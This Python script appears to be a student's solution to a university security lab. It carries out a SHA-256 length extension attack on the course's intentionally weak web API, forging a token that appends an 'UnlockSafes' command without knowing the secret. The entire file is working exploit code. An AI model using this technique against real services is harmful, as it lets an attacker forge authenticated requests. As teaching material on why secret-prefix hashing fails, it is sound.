# Script that execures a length extension attack on a weak website

#!/usr/bin/python3

# Run me like this:
# $ python3 len_ext_attack.py "https://project1.eecs388.org/uniqname/lengthextension/api?token=...."
# or select "Length Extension" from the VS Code debugger

import sys
from urllib.parse import quote
from pysha256 import sha256, padding


class URL:
    def __init__(self, url: str):
        # prefix is the slice of the URL from "https://" to "token=", inclusive.
        self.prefix = url[:url.find('=') + 1]
        self.token = url[url.find('=') + 1:url.find('&')]
        # suffix starts at the first "command=" and goes to the end of the URL
        self.suffix = url[url.find('&') + 1:]

    def __str__(self) -> str:
        return f'{self.prefix}{self.token}&{self.suffix}'

    def __repr__(self) -> str:
        return f'{type(self).__name__}({str(self).__repr__()})'


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    url = URL(sys.argv[1])

    #8 bytes plus byte length of commands from URL to calculate length of original message
    len_m = 8 + len(url.suffix)
    
    #compute length of original message and padding
    padded_len_m = len_m + len(padding(len_m))
        
    #construct new SHA256 object with state from URL
    sha = sha256(
        state=bytes.fromhex(url.token),
        count = padded_len_m,
    )
    
    # perform lengh extension
    #encode added command and update SHA256 object
    x = ('&command=UnlockSafes').encode()
    sha.update(x)
    #calculate new token
    url.token = sha.hexdigest()
     
    # command we need to add to the token as well as URL
    url.suffix += quote(padding(len_m)) + '&command=UnlockSafes'
    
    print(url)

if __name__ == '__main__':
    main()
